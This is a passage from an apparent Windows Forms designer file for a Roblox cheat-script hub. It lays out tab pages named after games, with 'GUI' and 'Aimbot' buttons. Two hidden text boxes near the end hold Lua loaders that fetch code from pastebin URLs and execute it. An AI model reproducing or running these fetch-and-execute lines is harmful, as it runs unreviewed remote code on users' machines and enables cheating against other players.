            this.flatButton394.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton394.UseCustomColor = false;
            this.flatButton394.Click += new System.EventHandler(this.flatButton394_Click);
            // 
            // tabPage141
            // 
            this.tabPage141.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage141.Controls.Add(this.flatButton395);
            this.tabPage141.Controls.Add(this.pictureBox248);
            this.tabPage141.Controls.Add(this.flatButton396);
            this.tabPage141.Location = new System.Drawing.Point(4, 44);
            this.tabPage141.Name = "tabPage141";
            this.tabPage141.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage141.Size = new System.Drawing.Size(514, 249);
            this.tabPage141.TabIndex = 136;
            this.tabPage141.Text = "Lost";
            // 
            // flatButton395
            // 
            this.flatButton395.BackColor = System.Drawing.Color.Transparent;
            this.flatButton395.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton395.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton395.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton395.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton395.Location = new System.Drawing.Point(557, 369);
            this.flatButton395.Name = "flatButton395";
            this.flatButton395.Rounded = false;
            this.flatButton395.Size = new System.Drawing.Size(106, 35);
            this.flatButton395.TabIndex = 39;
            this.flatButton395.Text = "Home";
            this.flatButton395.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton395.UseCustomColor = false;
            this.flatButton395.Click += new System.EventHandler(this.flatButton395_Click);
            // 
            // pictureBox248
            // 
            this.pictureBox248.Location = new System.Drawing.Point(514, 6);
            this.pictureBox248.Name = "pictureBox248";
            this.pictureBox248.Size = new System.Drawing.Size(149, 149);
            this.pictureBox248.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox248.TabIndex = 38;
            this.pictureBox248.TabStop = false;
            // 
            // flatButton396
            // 
            this.flatButton396.BackColor = System.Drawing.Color.Transparent;
            this.flatButton396.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton396.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton396.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton396.Location = new System.Drawing.Point(6, 6);
            this.flatButton396.Name = "flatButton396";
            this.flatButton396.Rounded = false;
            this.flatButton396.Size = new System.Drawing.Size(106, 35);
            this.flatButton396.TabIndex = 37;
            this.flatButton396.Text = "GUI";
            this.flatButton396.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton396.UseCustomColor = false;
            this.flatButton396.Click += new System.EventHandler(this.flatButton396_Click);
            // 
            // tabPage142
            // 
            this.tabPage142.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage142.Controls.Add(this.flatButton397);
            this.tabPage142.Controls.Add(this.pictureBox249);
            this.tabPage142.Controls.Add(this.flatButton398);
            this.tabPage142.Location = new System.Drawing.Point(4, 44);
            this.tabPage142.Name = "tabPage142";
            this.tabPage142.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage142.Size = new System.Drawing.Size(514, 249);
            this.tabPage142.TabIndex = 137;
            this.tabPage142.Text = "World Of Magic";
            // 
            // flatButton397
            // 
            this.flatButton397.BackColor = System.Drawing.Color.Transparent;
            this.flatButton397.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton397.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton397.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton397.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton397.Location = new System.Drawing.Point(557, 369);
            this.flatButton397.Name = "flatButton397";
            this.flatButton397.Rounded = false;
            this.flatButton397.Size = new System.Drawing.Size(106, 35);
            this.flatButton397.TabIndex = 42;
            this.flatButton397.Text = "Home";
            this.flatButton397.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton397.UseCustomColor = false;
            this.flatButton397.Click += new System.EventHandler(this.flatButton397_Click);
            // 
            // pictureBox249
            // 
            this.pictureBox249.Location = new System.Drawing.Point(514, 6);
            this.pictureBox249.Name = "pictureBox249";
            this.pictureBox249.Size = new System.Drawing.Size(149, 149);
            this.pictureBox249.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox249.TabIndex = 41;
            this.pictureBox249.TabStop = false;
            // 
            // flatButton398
            // 
            this.flatButton398.BackColor = System.Drawing.Color.Transparent;
            this.flatButton398.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton398.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton398.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton398.Location = new System.Drawing.Point(6, 6);
            this.flatButton398.Name = "flatButton398";
            this.flatButton398.Rounded = false;
            this.flatButton398.Size = new System.Drawing.Size(106, 35);
            this.flatButton398.TabIndex = 40;
            this.flatButton398.Text = "GUI";
            this.flatButton398.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton398.UseCustomColor = false;
            this.flatButton398.Click += new System.EventHandler(this.flatButton398_Click);
            // 
            // tabPage143
            // 
            this.tabPage143.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage143.Controls.Add(this.flatButton405);
            this.tabPage143.Controls.Add(this.pictureBox257);
            this.tabPage143.Controls.Add(this.flatButton406);
            this.tabPage143.Location = new System.Drawing.Point(4, 44);
            this.tabPage143.Name = "tabPage143";
            this.tabPage143.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage143.Size = new System.Drawing.Size(514, 249);
            this.tabPage143.TabIndex = 138;
            this.tabPage143.Text = "Stands Online";
            // 
            // flatButton405
            // 
            this.flatButton405.BackColor = System.Drawing.Color.Transparent;
            this.flatButton405.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton405.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton405.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton405.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton405.Location = new System.Drawing.Point(557, 369);
            this.flatButton405.Name = "flatButton405";
            this.flatButton405.Rounded = false;
            this.flatButton405.Size = new System.Drawing.Size(106, 35);
            this.flatButton405.TabIndex = 45;
            this.flatButton405.Text = "Home";
            this.flatButton405.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton405.UseCustomColor = false;
            this.flatButton405.Click += new System.EventHandler(this.flatButton405_Click);
            // 
            // pictureBox257
            // 
            this.pictureBox257.Location = new System.Drawing.Point(514, 6);
            this.pictureBox257.Name = "pictureBox257";
            this.pictureBox257.Size = new System.Drawing.Size(149, 149);
            this.pictureBox257.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox257.TabIndex = 44;
            this.pictureBox257.TabStop = false;
            // 
            // flatButton406
            // 
            this.flatButton406.BackColor = System.Drawing.Color.Transparent;
            this.flatButton406.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton406.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton406.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton406.Location = new System.Drawing.Point(6, 6);
            this.flatButton406.Name = "flatButton406";
            this.flatButton406.Rounded = false;
            this.flatButton406.Size = new System.Drawing.Size(106, 35);
            this.flatButton406.TabIndex = 43;
            this.flatButton406.Text = "GUI";
            this.flatButton406.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton406.UseCustomColor = false;
            this.flatButton406.Click += new System.EventHandler(this.flatButton406_Click);
            // 
            // tabPage144
            // 
            this.tabPage144.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage144.Controls.Add(this.flatButton407);
            this.tabPage144.Controls.Add(this.pictureBox258);
            this.tabPage144.Controls.Add(this.flatButton408);
            this.tabPage144.Location = new System.Drawing.Point(4, 44);
            this.tabPage144.Name = "tabPage144";
            this.tabPage144.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage144.Size = new System.Drawing.Size(514, 249);
            this.tabPage144.TabIndex = 139;
            this.tabPage144.Text = "Oretary";
            // 
            // flatButton407
            // 
            this.flatButton407.BackColor = System.Drawing.Color.Transparent;
            this.flatButton407.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton407.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton407.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton407.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton407.Location = new System.Drawing.Point(557, 369);
            this.flatButton407.Name = "flatButton407";
            this.flatButton407.Rounded = false;
            this.flatButton407.Size = new System.Drawing.Size(106, 35);
            this.flatButton407.TabIndex = 48;
            this.flatButton407.Text = "Home";
            this.flatButton407.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton407.UseCustomColor = false;
            this.flatButton407.Click += new System.EventHandler(this.flatButton407_Click);
            // 
            // pictureBox258
            // 
            this.pictureBox258.Location = new System.Drawing.Point(514, 6);
            this.pictureBox258.Name = "pictureBox258";
            this.pictureBox258.Size = new System.Drawing.Size(149, 149);
            this.pictureBox258.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox258.TabIndex = 47;
            this.pictureBox258.TabStop = false;
            // 
            // flatButton408
            // 
            this.flatButton408.BackColor = System.Drawing.Color.Transparent;
            this.flatButton408.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton408.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton408.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton408.Location = new System.Drawing.Point(6, 6);
            this.flatButton408.Name = "flatButton408";
            this.flatButton408.Rounded = false;
            this.flatButton408.Size = new System.Drawing.Size(106, 35);
            this.flatButton408.TabIndex = 46;
            this.flatButton408.Text = "GUI";
            this.flatButton408.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton408.UseCustomColor = false;
            this.flatButton408.Click += new System.EventHandler(this.flatButton408_Click);
            // 
            // tabPage145
            // 
            this.tabPage145.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage145.Controls.Add(this.flatButton409);
            this.tabPage145.Controls.Add(this.pictureBox259);
            this.tabPage145.Controls.Add(this.flatButton410);
            this.tabPage145.Location = new System.Drawing.Point(4, 44);
            this.tabPage145.Name = "tabPage145";
            this.tabPage145.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage145.Size = new System.Drawing.Size(514, 249);
            this.tabPage145.TabIndex = 140;
            this.tabPage145.Text = "Katana Simulator";
            // 
            // flatButton409
            // 
            this.flatButton409.BackColor = System.Drawing.Color.Transparent;
            this.flatButton409.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton409.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton409.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton409.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton409.Location = new System.Drawing.Point(557, 369);
            this.flatButton409.Name = "flatButton409";
            this.flatButton409.Rounded = false;
            this.flatButton409.Size = new System.Drawing.Size(106, 35);
            this.flatButton409.TabIndex = 51;
            this.flatButton409.Text = "Home";
            this.flatButton409.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton409.UseCustomColor = false;
            this.flatButton409.Click += new System.EventHandler(this.flatButton409_Click);
            // 
            // pictureBox259
            // 
            this.pictureBox259.Location = new System.Drawing.Point(514, 6);
            this.pictureBox259.Name = "pictureBox259";
            this.pictureBox259.Size = new System.Drawing.Size(149, 149);
            this.pictureBox259.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox259.TabIndex = 50;
            this.pictureBox259.TabStop = false;
            // 
            // flatButton410
            // 
            this.flatButton410.BackColor = System.Drawing.Color.Transparent;
            this.flatButton410.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton410.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton410.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton410.Location = new System.Drawing.Point(6, 6);
            this.flatButton410.Name = "flatButton410";
            this.flatButton410.Rounded = false;
            this.flatButton410.Size = new System.Drawing.Size(106, 35);
            this.flatButton410.TabIndex = 49;
            this.flatButton410.Text = "GUI";
            this.flatButton410.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton410.UseCustomColor = false;
            this.flatButton410.Click += new System.EventHandler(this.flatButton410_Click);
            // 
            // tabPage146
            // 
            this.tabPage146.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage146.Controls.Add(this.flatButton411);
            this.tabPage146.Controls.Add(this.pictureBox260);
            this.tabPage146.Controls.Add(this.flatButton412);
            this.tabPage146.Location = new System.Drawing.Point(4, 44);
            this.tabPage146.Name = "tabPage146";
            this.tabPage146.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage146.Size = new System.Drawing.Size(514, 249);
            this.tabPage146.TabIndex = 141;
            this.tabPage146.Text = "Castel Heist Adventures";
            // 
            // flatButton411
            // 
            this.flatButton411.BackColor = System.Drawing.Color.Transparent;
            this.flatButton411.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton411.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton411.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton411.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton411.Location = new System.Drawing.Point(557, 369);
            this.flatButton411.Name = "flatButton411";
            this.flatButton411.Rounded = false;
            this.flatButton411.Size = new System.Drawing.Size(106, 35);
            this.flatButton411.TabIndex = 54;
            this.flatButton411.Text = "Home";
            this.flatButton411.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton411.UseCustomColor = false;
            this.flatButton411.Click += new System.EventHandler(this.flatButton411_Click);
            // 
            // pictureBox260
            // 
            this.pictureBox260.Location = new System.Drawing.Point(514, 6);
            this.pictureBox260.Name = "pictureBox260";
            this.pictureBox260.Size = new System.Drawing.Size(149, 149);
            this.pictureBox260.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox260.TabIndex = 53;
            this.pictureBox260.TabStop = false;
            // 
            // flatButton412
            // 
            this.flatButton412.BackColor = System.Drawing.Color.Transparent;
            this.flatButton412.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton412.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton412.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton412.Location = new System.Drawing.Point(6, 6);
            this.flatButton412.Name = "flatButton412";
            this.flatButton412.Rounded = false;
            this.flatButton412.Size = new System.Drawing.Size(106, 35);
            this.flatButton412.TabIndex = 52;
            this.flatButton412.Text = "GUI";
            this.flatButton412.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton412.UseCustomColor = false;
            this.flatButton412.Click += new System.EventHandler(this.flatButton412_Click);
            // 
            // tabPage147
            // 
            this.tabPage147.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage147.Controls.Add(this.flatButton413);
            this.tabPage147.Controls.Add(this.pictureBox261);
            this.tabPage147.Controls.Add(this.flatButton414);
            this.tabPage147.Location = new System.Drawing.Point(4, 44);
            this.tabPage147.Name = "tabPage147";
            this.tabPage147.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage147.Size = new System.Drawing.Size(514, 249);
            this.tabPage147.TabIndex = 142;
            this.tabPage147.Text = "Super Blocky Ball";
            // 
            // flatButton413
            // 
            this.flatButton413.BackColor = System.Drawing.Color.Transparent;
            this.flatButton413.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton413.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton413.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton413.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton413.Location = new System.Drawing.Point(557, 369);
            this.flatButton413.Name = "flatButton413";
            this.flatButton413.Rounded = false;
            this.flatButton413.Size = new System.Drawing.Size(106, 35);
            this.flatButton413.TabIndex = 57;
            this.flatButton413.Text = "Home";
            this.flatButton413.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton413.UseCustomColor = false;
            this.flatButton413.Click += new System.EventHandler(this.flatButton413_Click);
            // 
            // pictureBox261
            // 
            this.pictureBox261.Location = new System.Drawing.Point(514, 6);
            this.pictureBox261.Name = "pictureBox261";
            this.pictureBox261.Size = new System.Drawing.Size(149, 149);
            this.pictureBox261.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox261.TabIndex = 56;
            this.pictureBox261.TabStop = false;
            // 
            // flatButton414
            // 
            this.flatButton414.BackColor = System.Drawing.Color.Transparent;
            this.flatButton414.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton414.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton414.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton414.Location = new System.Drawing.Point(6, 6);
            this.flatButton414.Name = "flatButton414";
            this.flatButton414.Rounded = false;
            this.flatButton414.Size = new System.Drawing.Size(106, 35);
            this.flatButton414.TabIndex = 55;
            this.flatButton414.Text = "GUI";
            this.flatButton414.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton414.UseCustomColor = false;
            this.flatButton414.Click += new System.EventHandler(this.flatButton414_Click);
            // 
            // tabPage148
            // 
            this.tabPage148.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage148.Controls.Add(this.flatButton415);
            this.tabPage148.Controls.Add(this.pictureBox262);
            this.tabPage148.Controls.Add(this.flatButton416);
            this.tabPage148.Location = new System.Drawing.Point(4, 44);
            this.tabPage148.Name = "tabPage148";
            this.tabPage148.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage148.Size = new System.Drawing.Size(514, 249);
            this.tabPage148.TabIndex = 143;
            this.tabPage148.Text = "Make A Cake";
            // 
            // flatButton415
            // 
            this.flatButton415.BackColor = System.Drawing.Color.Transparent;
            this.flatButton415.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton415.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton415.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton415.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton415.Location = new System.Drawing.Point(557, 369);
            this.flatButton415.Name = "flatButton415";
            this.flatButton415.Rounded = false;
            this.flatButton415.Size = new System.Drawing.Size(106, 35);
            this.flatButton415.TabIndex = 60;
            this.flatButton415.Text = "Home";
            this.flatButton415.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton415.UseCustomColor = false;
            this.flatButton415.Click += new System.EventHandler(this.flatButton415_Click);
            // 
            // pictureBox262
            // 
            this.pictureBox262.Location = new System.Drawing.Point(514, 6);
            this.pictureBox262.Name = "pictureBox262";
            this.pictureBox262.Size = new System.Drawing.Size(149, 149);
            this.pictureBox262.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox262.TabIndex = 59;
            this.pictureBox262.TabStop = false;
            // 
            // flatButton416
            // 
            this.flatButton416.BackColor = System.Drawing.Color.Transparent;
            this.flatButton416.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton416.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton416.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton416.Location = new System.Drawing.Point(6, 6);
            this.flatButton416.Name = "flatButton416";
            this.flatButton416.Rounded = false;
            this.flatButton416.Size = new System.Drawing.Size(106, 35);
            this.flatButton416.TabIndex = 58;
            this.flatButton416.Text = "GUI";
            this.flatButton416.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton416.UseCustomColor = false;
            this.flatButton416.Click += new System.EventHandler(this.flatButton416_Click);
            // 
            // tabPage149
            // 
            this.tabPage149.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage149.Controls.Add(this.flatButton419);
            this.tabPage149.Controls.Add(this.flatButton420);
            this.tabPage149.Controls.Add(this.pictureBox263);
            this.tabPage149.Location = new System.Drawing.Point(4, 44);
            this.tabPage149.Name = "tabPage149";
            this.tabPage149.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage149.Size = new System.Drawing.Size(514, 249);
            this.tabPage149.TabIndex = 144;
            this.tabPage149.Text = "Counter Blox";
            // 
            // flatButton419
            // 
            this.flatButton419.BackColor = System.Drawing.Color.Transparent;
            this.flatButton419.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton419.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton419.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton419.Location = new System.Drawing.Point(6, 6);
            this.flatButton419.Name = "flatButton419";
            this.flatButton419.Rounded = false;
            this.flatButton419.Size = new System.Drawing.Size(106, 35);
            this.flatButton419.TabIndex = 22;
            this.flatButton419.Text = "Aimbot";
            this.flatButton419.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton419.UseCustomColor = false;
            this.flatButton419.Click += new System.EventHandler(this.flatButton419_Click);
            // 
            // flatButton420
            // 
            this.flatButton420.BackColor = System.Drawing.Color.Transparent;
            this.flatButton420.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton420.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton420.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton420.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton420.Location = new System.Drawing.Point(557, 369);
            this.flatButton420.Name = "flatButton420";
            this.flatButton420.Rounded = false;
            this.flatButton420.Size = new System.Drawing.Size(106, 35);
            this.flatButton420.TabIndex = 21;
            this.flatButton420.Text = "Home";
            this.flatButton420.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton420.UseCustomColor = false;
            this.flatButton420.Click += new System.EventHandler(this.flatButton420_Click);
            // 
            // pictureBox263
            // 
            this.pictureBox263.Location = new System.Drawing.Point(514, 6);
            this.pictureBox263.Name = "pictureBox263";
            this.pictureBox263.Size = new System.Drawing.Size(149, 149);
            this.pictureBox263.TabIndex = 20;
            this.pictureBox263.TabStop = false;
            // 
            // tabPage150
            // 
            this.tabPage150.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage150.Controls.Add(this.flatButton428);
            this.tabPage150.Controls.Add(this.pictureBox271);
            this.tabPage150.Controls.Add(this.richTextBox96);
            this.tabPage150.Controls.Add(this.flatButton429);
            this.tabPage150.Location = new System.Drawing.Point(4, 44);
            this.tabPage150.Name = "tabPage150";
            this.tabPage150.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage150.Size = new System.Drawing.Size(514, 249);
            this.tabPage150.TabIndex = 145;
            this.tabPage150.Text = "Blox Hunt";
            // 
            // flatButton428
            // 
            this.flatButton428.BackColor = System.Drawing.Color.Transparent;
            this.flatButton428.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton428.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton428.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton428.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton428.Location = new System.Drawing.Point(557, 369);
            this.flatButton428.Name = "flatButton428";
            this.flatButton428.Rounded = false;
            this.flatButton428.Size = new System.Drawing.Size(106, 35);
            this.flatButton428.TabIndex = 25;
            this.flatButton428.Text = "Home";
            this.flatButton428.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton428.UseCustomColor = false;
            this.flatButton428.Click += new System.EventHandler(this.flatButton428_Click);
            // 
            // pictureBox271
            // 
            this.pictureBox271.Location = new System.Drawing.Point(514, 6);
            this.pictureBox271.Name = "pictureBox271";
            this.pictureBox271.Size = new System.Drawing.Size(149, 149);
            this.pictureBox271.TabIndex = 24;
            this.pictureBox271.TabStop = false;
            // 
            // richTextBox96
            // 
            this.richTextBox96.Location = new System.Drawing.Point(6, 47);
            this.richTextBox96.Name = "richTextBox96";
            this.richTextBox96.Size = new System.Drawing.Size(106, 178);
            this.richTextBox96.TabIndex = 23;
            this.richTextBox96.Text = "loadstring(game:HttpGet(\"https://pastebin.com/raw/qwXa4EGY\", true))()\n";
            this.richTextBox96.Visible = false;
            // 
            // flatButton429
            // 
            this.flatButton429.BackColor = System.Drawing.Color.Transparent;
            this.flatButton429.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton429.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton429.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton429.Location = new System.Drawing.Point(6, 6);
            this.flatButton429.Name = "flatButton429";
            this.flatButton429.Rounded = false;
            this.flatButton429.Size = new System.Drawing.Size(106, 35);
            this.flatButton429.TabIndex = 22;
            this.flatButton429.Text = "Gui";
            this.flatButton429.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton429.UseCustomColor = false;
            this.flatButton429.Click += new System.EventHandler(this.flatButton429_Click);
            // 
            // tabPage151
            // 
            this.tabPage151.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage151.Controls.Add(this.flatButton430);
            this.tabPage151.Controls.Add(this.pictureBox272);
            this.tabPage151.Controls.Add(this.richTextBox97);
            this.tabPage151.Controls.Add(this.flatButton431);
            this.tabPage151.Location = new System.Drawing.Point(4, 44);
            this.tabPage151.Name = "tabPage151";
            this.tabPage151.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage151.Size = new System.Drawing.Size(514, 249);
            this.tabPage151.TabIndex = 146;
            this.tabPage151.Text = "Pizza Simulator";
            // 
            // flatButton430
            // 
            this.flatButton430.BackColor = System.Drawing.Color.Transparent;
            this.flatButton430.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton430.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton430.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton430.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton430.Location = new System.Drawing.Point(557, 369);
            this.flatButton430.Name = "flatButton430";
            this.flatButton430.Rounded = false;
            this.flatButton430.Size = new System.Drawing.Size(106, 35);
            this.flatButton430.TabIndex = 29;
            this.flatButton430.Text = "Home";
            this.flatButton430.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton430.UseCustomColor = false;
            this.flatButton430.Click += new System.EventHandler(this.flatButton430_Click);
            // 
            // pictureBox272
            // 
            this.pictureBox272.Location = new System.Drawing.Point(514, 6);
            this.pictureBox272.Name = "pictureBox272";
            this.pictureBox272.Size = new System.Drawing.Size(149, 149);
            this.pictureBox272.TabIndex = 28;
            this.pictureBox272.TabStop = false;
            // 
            // richTextBox97
            // 
            this.richTextBox97.Location = new System.Drawing.Point(6, 47);
            this.richTextBox97.Name = "richTextBox97";
            this.richTextBox97.Size = new System.Drawing.Size(106, 178);
            this.richTextBox97.TabIndex = 27;
            this.richTextBox97.Text = "loadstring(game:HttpGet(\"https://pastebin.com/raw/9KH9Wa61\"))()\n";
            this.richTextBox97.Visible = false;
            // 
            // flatButton431
            // 
            this.flatButton431.BackColor = System.Drawing.Color.Transparent;
            this.flatButton431.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton431.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton431.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton431.Location = new System.Drawing.Point(6, 6);
            this.flatButton431.Name = "flatButton431";
            this.flatButton431.Rounded = false;
            this.flatButton431.Size = new System.Drawing.Size(106, 35);
            this.flatButton431.TabIndex = 26;
            this.flatButton431.Text = "Gui";
